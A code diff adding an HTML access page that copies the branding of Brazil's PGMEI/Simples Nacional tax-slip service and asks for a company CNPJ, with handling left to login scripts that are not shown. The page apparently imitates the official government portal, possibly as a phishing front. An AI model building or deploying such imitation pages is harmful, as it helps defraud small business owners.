@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>PGMEI - Acesso</title>
+  <link rel="icon" type="image/svg+xml" href='data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><defs><linearGradient id="bg" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="%23f8fff2"/><stop offset="1" stop-color="%23dcefc3"/></linearGradient><linearGradient id="dot" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="%2373bf58"/><stop offset="1" stop-color="%2348953a"/></linearGradient></defs><rect x="4" y="4" width="56" height="56" rx="14" fill="url(%23bg)"/><circle cx="32" cy="32" r="15" fill="url(%23dot)"/><rect x="25" y="25" width="14" height="14" rx="4" fill="%23ffffff"/></svg>'>
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
+  <link href="/assets/pgmei.css" rel="stylesheet">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+</head>
+<body>
+  <div class="container-fluid">
+    <header class="row">
+      <h3><span class="label label-success"><span class="brand-mark" aria-hidden="true"></span> PGMEI</span></h3>
+      <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
+    </header>
+
+    <section class="row">
+      <div class="well col-md-12" role="main">
+        <div class="container">
+          <div id="page-form" class="step-container">
+            <div class="row">
+              <div class="col-md-offset-3 col-md-5">
+                <div class="panel panel-default">
+                  <div class="panel-heading">
+                    <h4 class="panel-title">Informe o número completo do CNPJ</h4>
+                  </div>
+                  <div class="panel-body">
+                    <form id="identificacao" method="post" action="javascript:void(0);" role="form">
+                      <div class="form-group">
+                        <div class="col-md-offset-1 col-md-8">
+                          <div class="form-group">
+                            <label for="cnpj" class="control-label">CNPJ completo:</label>
+                            <input type="tel" id="cnpj" class="form-control" name="cnpj" autocomplete="off" autofocus title="Informe o CNPJ completo.">
+                            <br>
+                            <div style="color:#555;font-weight:500;font-size:8px;line-height:8px;">
+                              <br>
+                              <strong>Protegido por validação de acesso</strong><br>
+                              <span>Confira o CNPJ antes de continuar.</span>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="col-md-offset-1 col-md-11">
+                          <div class="form-group">
+                            <button id="continuar" type="submit" class="btn btn-success">Continuar</button>
+                          </div>
+                        </div>
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="row clearfix">
+      <div class="pull-left">
+        <p class="text-success"><strong>Versão: 3.17.0</strong></p>
+      </div>
+      <div class="pull-right"><div class="footer-brand">Simples Nacional</div></div>
+    </footer>
+  </div>
+
+  <script src="/assets/app-common.js"></script>
+  <script src="/assets/login.js"></script>
+</body>
+</html>
